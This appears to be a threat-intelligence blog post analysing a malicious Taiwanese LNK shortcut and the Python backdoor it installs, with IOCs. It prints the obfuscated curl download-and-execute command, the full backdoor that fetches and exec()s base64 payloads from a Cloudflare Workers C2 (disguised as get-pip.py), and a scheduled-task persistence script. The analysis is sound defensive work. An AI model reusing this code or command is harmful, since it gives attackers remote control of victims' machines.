<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Python Backdoor Uploaded from Taiwan" /><meta property="og:locale" content="en" /><meta name="description" content="On April 18, 2025, I came across an interesting LNK file uploaded from Taiwan (f4bb263eb03240c1d779a00e1e39d3374c93d909d358691ca5386387d06be472), which I subsequently found had been initially discovered by @NtAlertThread. Props to him for the discovery. The LNK file in question is named 2025416-方案1-方案細節.pdf.lnk, which translates to 2025416-Scheme 1-Scheme details.pdf.lnk. The file was uploaded from Taiwan on April 18, 2025." /><meta property="og:description" content="On April 18, 2025, I came across an interesting LNK file uploaded from Taiwan (f4bb263eb03240c1d779a00e1e39d3374c93d909d358691ca5386387d06be472), which I subsequently found had been initially discovered by @NtAlertThread. Props to him for the discovery. The LNK file in question is named 2025416-方案1-方案細節.pdf.lnk, which translates to 2025416-Scheme 1-Scheme details.pdf.lnk. The file was uploaded from Taiwan on April 18, 2025." /><link rel="canonical" href="https://dmpdump.github.io/posts/Python_Backdoor_TW/" /><meta property="og:url" content="https://dmpdump.github.io/posts/Python_Backdoor_TW/" /><meta property="og:site_name" content="dmpdump" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-04-18T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Python Backdoor Uploaded from Taiwan" /><meta name="twitter:site" content="@G60930953" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-04-18T00:00:00+00:00","datePublished":"2025-04-18T00:00:00+00:00","description":"On April 18, 2025, I came across an interesting LNK file uploaded from Taiwan (f4bb263eb03240c1d779a00e1e39d3374c93d909d358691ca5386387d06be472), which I subsequently found had been initially discovered by @NtAlertThread. Props to him for the discovery. The LNK file in question is named 2025416-方案1-方案細節.pdf.lnk, which translates to 2025416-Scheme 1-Scheme details.pdf.lnk. The file was uploaded from Taiwan on April 18, 2025.","headline":"Python Backdoor Uploaded from Taiwan","mainEntityOfPage":{"@type":"WebPage","@id":"https://dmpdump.github.io/posts/Python_Backdoor_TW/"},"url":"https://dmpdump.github.io/posts/Python_Backdoor_TW/"}</script><title>Python Backdoor Uploaded from Taiwan | dmpdump</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="dmpdump"><meta name="application-name" content="dmpdump"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/">dmpdump</a></h1><p class="site-subtitle fst-italic mb-0">CTI, RE, Programming</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/dmpdump" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/G60930953" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dmpdump','tuta.io'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Python Backdoor Uploaded from Taiwan</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>Python Backdoor Uploaded from Taiwan</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1744934400" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Apr 18, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/dmpdump">dmpdump</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="984 words" > <em>5 min</em> read</span></div></div></div></header><div class="content"><p>On April 18, 2025, I came across an interesting LNK file uploaded from Taiwan (f4bb263eb03240c1d779a00e1e39d3374c93d909d358691ca5386387d06be472), which I subsequently found had been initially discovered by <a href="https://x.com/ElementalX2/status/1913247237771083802">@NtAlertThread</a>. Props to him for the discovery. The LNK file in question is named <code class="language-plaintext highlighter-rouge">2025416-方案1-方案細節.pdf.lnk</code>, which translates to <code class="language-plaintext highlighter-rouge">2025416-Scheme 1-Scheme details.pdf.lnk</code>. The file was uploaded from Taiwan on April 18, 2025.</p><p><a href="/assets/images/bdoor_tw/vt.png" class="popup img-link shimmer"><img src="/assets/images/bdoor_tw/vt.png" alt="sshot" loading="lazy"></a></p><p>This shortcut file is a simple curl downloader for a next stage executable. The executable, named <code class="language-plaintext highlighter-rouge">setup.exe</code>, is downloaded from <code class="language-plaintext highlighter-rouge">mail[.]9kyd.com/skins</code> to <code class="language-plaintext highlighter-rouge">C:\Users\Public\Downloads</code>.</p><div class="language-batch highlighter-rouge"><div class="code-header"> <span data-label-text="Batch"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="na">/c </span><span class="se">^c^u^r^l</span> <span class="kd">https</span>://mail<span class="o">[</span>.<span class="o">]</span><span class="m">9</span><span class="kd">kyd</span>.com/skins/setup.exe <span class="na">-o </span><span class="kd">C</span>:\Users\Public\Downloads\setup.exe <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="se">^s^t^a^r^t</span> /<span class="se">^B</span> <span class="kd">C</span>:\Users\Public\Downloads\setup.exe<span class="o">)</span>
</pre></table></code></div></div><p>According to the LNK metadata, it was created on a machine named <code class="language-plaintext highlighter-rouge">desktop-8g6b11u</code> on April 13, 2025.</p><p><a href="/assets/images/bdoor_tw/lnk_meta.png" class="popup img-link shimmer"><img src="/assets/images/bdoor_tw/lnk_meta.png" alt="sshot" loading="lazy"></a></p><p><code class="language-plaintext highlighter-rouge">Setup.exe</code> (4e256572e001b76872074878f8ecd2be3f237c9b3a18d0059e2f4a3888579b5b) is an installer created with Indigo Rose Software Setup Factory. In the past, I saw multiple Gh0stRAT samples targeting Chinese-speaking users using this installer. Indigo Rose’s Setup Factory supports Lua scripting to configure the installation process.</p><p><a href="/assets/images/bdoor_tw/indigo.png" class="popup img-link shimmer"><img src="/assets/images/bdoor_tw/indigo.png" alt="sshot" loading="lazy"></a></p><p>Upon execution, the installer drops files to <code class="language-plaintext highlighter-rouge">C:\Users\%USER%\AppData\Roaming\AcrobatReader\</code>, including the Python runtime environment and a decoy PDF. The installer opens the decoy PDF, named <code class="language-plaintext highlighter-rouge">document.pdf</code>, which contains illegible content, and runs a python script named <code class="language-plaintext highlighter-rouge">setup.py</code>.</p><p>Excerpt from the PDF content:</p><p><a href="/assets/images/bdoor_tw/pdf.png" class="popup img-link shimmer"><img src="/assets/images/bdoor_tw/pdf.png" alt="sshot" loading="lazy"></a></p><p>Dropped files:</p><p><a href="/assets/images/bdoor_tw/dropped.png" class="popup img-link shimmer"><img src="/assets/images/bdoor_tw/dropped.png" alt="sshot" loading="lazy"></a></p><h1 id="backdoor">Backdoor</h1><p>The <code class="language-plaintext highlighter-rouge">setup.py</code> script is a very simple backdoor that uses Cloudflare Workers as command and control infrastructure. The backdoor:</p><ul><li>Runs a continuous loop with a delay which starts a new thread and runs the <code class="language-plaintext highlighter-rouge">mythread()</code> function<li>Makes a request to the C2 <code class="language-plaintext highlighter-rouge">eip.netask.workers[.]dev</code> and reads the response<li>Checks if the response is GZIP-compressed. If it is, it decompresses it<li>It converts the response to UTF-8<li>If the length of the response is longer than 2 characters, it base64-decodes it and executes it, skipping the first 2 characters</ul><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
#
# Hi There!
#
# You may be wondering what this giant blob of binary data here is, you might
# even be worried that we're up to something nefarious (good for you for being
# paranoid!). This is a base85 encoding of a zip file, this zip file contains
# an entire copy of pip (version 24.0).
#
# Pip is a thing that installs packages, pip itself is a package that someone
# might want to install, especially if they're looking to run this get-pip.py
# script. Pip has a lot of code to deal with the security of installing
# packages, various edge cases on various platforms, and other such sort of
# "tribal knowledge" that has been encoded in its code base. Because of this
# we basically include an entire copy of pip inside this blob. We do this
# because the alternatives are attempt to implement a "minipip" that probably
# doesn't do things correctly and has weird edge cases, or compress pip itself
# down into a single file.
#
# If you're wondering how this is created, it is generated using
# `scripts/generate.py` in https://github.com/pypa/get-pip.
</span>
<span class="kn">import</span> <span class="n">copy</span>
<span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">import</span> <span class="n">html</span>
<span class="kn">import</span> <span class="n">http.client</span>
<span class="kn">import</span> <span class="n">io</span>
<span class="kn">import</span> <span class="n">mimetypes</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">posixpath</span>
<span class="kn">import</span> <span class="n">select</span>
<span class="kn">import</span> <span class="n">shutil</span>
<span class="kn">import</span> <span class="n">sys</span><span class="p">,</span><span class="n">time</span><span class="p">,</span><span class="n">_thread</span><span class="p">,</span><span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">,</span><span class="n">base64</span><span class="p">,</span><span class="n">random</span>
<span class="n">total</span><span class="p">,</span> <span class="n">used</span><span class="p">,</span> <span class="n">free</span> <span class="o">=</span> <span class="n">shutil</span><span class="p">.</span><span class="nf">disk_usage</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">)</span>
<span class="n">sid</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">total</span><span class="o">%</span><span class="mi">9999</span><span class="p">)</span>

<span class="n">stime</span><span class="o">=</span><span class="mi">60</span>
<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">hxxps://eip.netask.workers[.]dev/</span><span class="sh">"</span>
<span class="n">hdr</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">User-Agent</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><span class="sh">'</span><span class="p">,</span>
	<span class="sh">'</span><span class="s">Accept</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><span class="sh">'</span><span class="p">,</span>
	<span class="sh">'</span><span class="s">Accept-Language</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><span class="sh">'</span><span class="p">,</span>
	<span class="sh">'</span><span class="s">Accept-Encoding</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">gzip, deflate, identity</span><span class="sh">'</span><span class="p">,</span>
	<span class="sh">'</span><span class="s">Session</span><span class="sh">'</span><span class="p">:</span><span class="n">sid</span><span class="p">,</span>
	<span class="sh">'</span><span class="s">DNT</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">,</span>
	<span class="sh">'</span><span class="s">Cookie</span><span class="sh">'</span><span class="p">:</span><span class="sh">''</span><span class="p">,</span>
	<span class="sh">'</span><span class="s">Sec-Fetch-Dest</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">empty</span><span class="sh">'</span><span class="p">,</span>
	<span class="sh">'</span><span class="s">Sec-Fetch-Mode</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">cors</span><span class="sh">'</span><span class="p">,</span>
	<span class="sh">'</span><span class="s">Sec-Fetch-Site</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">same-origin</span><span class="sh">'</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">mythread</span><span class="p">(</span><span class="n">axcs</span><span class="p">):</span>
	<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">mythread...</span><span class="sh">'</span><span class="p">)</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">hdr</span><span class="p">[</span><span class="sh">'</span><span class="s">Cookie</span><span class="sh">'</span><span class="p">]</span><span class="o">=</span><span class="sh">''</span>
		<span class="n">req</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="nc">Request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">hdr</span><span class="p">)</span>
		<span class="n">response</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="nf">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
		
		<span class="n">rsph</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="nf">info</span><span class="p">()</span>
		<span class="nf">if </span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Encoding</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">rsph</span> <span class="ow">and</span> <span class="n">rsph</span><span class="p">[</span><span class="sh">'</span><span class="s">Content-Encoding</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">gzip</span><span class="sh">'</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="sh">'</span><span class="s">content-encoding</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">rsph</span> <span class="ow">and</span> <span class="n">rsph</span><span class="p">[</span><span class="sh">'</span><span class="s">content-encoding</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">gzip</span><span class="sh">'</span><span class="p">):</span>
			<span class="kn">import</span> <span class="n">gzip</span>
			<span class="n">content</span> <span class="o">=</span> <span class="n">gzip</span><span class="p">.</span><span class="nf">decompress</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="n">content</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
		<span class="n">html</span> <span class="o">=</span> <span class="n">content</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
		<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">html</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
			<span class="nf">exec</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">html</span><span class="p">[</span><span class="mi">2</span><span class="p">:]).</span><span class="nf">decode</span><span class="p">())</span>
	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
		<span class="nf">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">...:</span><span class="sh">'</span><span class="p">,</span><span class="n">stime</span><span class="p">)</span>
		<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
		<span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">stime</span><span class="p">:</span>
			<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
			<span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
		<span class="n">_thread</span><span class="p">.</span><span class="nf">start_new_thread</span><span class="p">(</span> <span class="n">mythread</span><span class="p">,</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">)</span> <span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
	<span class="k">pass</span>

</pre></table></code></div></div><p>In order to get additional payload without executing it, I modified the <code class="language-plaintext highlighter-rouge">mythread()</code> function to write the payload to disk instead of executing it:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre> <span class="n">rsph</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="nf">info</span><span class="p">()</span>
        <span class="nf">if </span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Encoding</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">rsph</span> <span class="ow">and</span> <span class="n">rsph</span><span class="p">[</span><span class="sh">'</span><span class="s">Content-Encoding</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">gzip</span><span class="sh">'</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="sh">'</span><span class="s">content-encoding</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">rsph</span> <span class="ow">and</span> <span class="n">rsph</span><span class="p">[</span><span class="sh">'</span><span class="s">content-encoding</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">gzip</span><span class="sh">'</span><span class="p">):</span>
            <span class="kn">import</span> <span class="n">gzip</span>
            <span class="n">content</span> <span class="o">=</span> <span class="n">gzip</span><span class="p">.</span><span class="nf">decompress</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">content</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
        <span class="n">content_text</span> <span class="o">=</span> <span class="n">content</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>  
        <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">content_text</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">content_text</span><span class="p">[</span><span class="mi">2</span><span class="p">:])</span>
            <span class="n">timestamp</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">().</span><span class="nf">strftime</span><span class="p">(</span><span class="sh">"</span><span class="s">%Y%m%d_%H%M%S</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">filename</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">payload_</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s">.bin</span><span class="sh">"</span>
            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Payload saved to </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p>After some initial requests without any reponses, I obtained two payloads:</p><p><a href="/assets/images/bdoor_tw/response.png" class="popup img-link shimmer"><img src="/assets/images/bdoor_tw/response.png" alt="sshot" loading="lazy"></a></p><p>The first payload I received is a Python script which creates a Visual Basic persistence script named <code class="language-plaintext highlighter-rouge">start.vbs</code>. The script searches for the running processes, if it finds that python.exe is running, it exits. If it is not running, it runs the initial setup.py (the backdoor) with python.exe. Additionally, it creates a scheduled task named <code class="language-plaintext highlighter-rouge">TaskMachineCore</code>, which runs every 10 minutes, executing the newly created <code class="language-plaintext highlighter-rouge">start.vbs</code> persistence script.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="n">pwd</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">abspath</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">dirname</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
<span class="n">fvb2</span> <span class="o">=</span> <span class="n">pwd</span><span class="o">+</span><span class="sh">'</span><span class="se">\\</span><span class="s">start.vbs</span><span class="sh">'</span>
<span class="n">fp</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">fvb2</span><span class="p">,</span><span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fp</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sh">'''</span><span class="s">set ii = getobject(</span><span class="sh">"</span><span class="s">winmgmts:win32_process</span><span class="sh">"</span><span class="s">).instances_
for each p in ii
if p.name = </span><span class="sh">"</span><span class="s">python.exe</span><span class="sh">"</span><span class="s"> then
WScript.Quit
end if
next
</span><span class="sh">'''</span><span class="p">)</span>
<span class="n">fp</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sh">'</span><span class="s">CreateObject(</span><span class="sh">"</span><span class="s">WScript.Shell</span><span class="sh">"</span><span class="s">).Run </span><span class="sh">"'</span><span class="o">+</span><span class="n">pwd</span><span class="o">+</span><span class="sh">"</span><span class="se">\\</span><span class="s">python.exe </span><span class="sh">"</span><span class="o">+</span><span class="n">pwd</span><span class="o">+</span><span class="sh">"</span><span class="se">\\</span><span class="s">setup.py</span><span class="sh">"</span><span class="o">+</span><span class="sh">'"</span><span class="s">,0</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fp</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="n">name</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">abspath</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">dirname</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">Schtasks /create /tn TaskMachineCore /tr </span><span class="sh">'</span><span class="o">+</span><span class="n">fvb2</span><span class="o">+</span><span class="sh">'</span><span class="s"> /sc MINUTE /mo 10 /F</span><span class="sh">'</span><span class="p">)</span>
</pre></table></code></div></div><p>The second payload simply modifies the sleep time of the backdoor through the modification of the <code class="language-plaintext highlighter-rouge">stime</code> variable, changing it from the default value of 60 seconds (1 minute) to 3600 (one hour).</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">global</span> <span class="n">stime</span>
<span class="n">stime</span><span class="o">=</span><span class="mi">3600</span>
</pre></table></code></div></div><h1 id="iocs">IOCs</h1><ul><li>2025416-方案1-方案細節.pdf.lnk: f4bb263eb03240c1d779a00e1e39d3374c93d909d358691ca5386387d06be472<li>Payload hosting site: mail[.]9kyd.com/skins<li>Setup.exe: 4e256572e001b76872074878f8ecd2be3f237c9b3a18d0059e2f4a3888579b5b<li>Setup.py: 6721f5c45548b75af91526bf0afc83dd0017572453e3a37bd95b8b6ac98b9746<li>C2: https://eip.netask.workers[.]dev:443</ul></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/cti/" class="post-tag no-text-decoration" >cti</a> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Python%20Backdoor%20Uploaded%20from%20Taiwan%20-%20dmpdump&url=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FPython_Backdoor_TW%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Python%20Backdoor%20Uploaded%20from%20Taiwan%20-%20dmpdump&u=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FPython_Backdoor_TW%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FPython_Backdoor_TW%2F&text=Python%20Backdoor%20Uploaded%20from%20Taiwan%20-%20dmpdump" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" 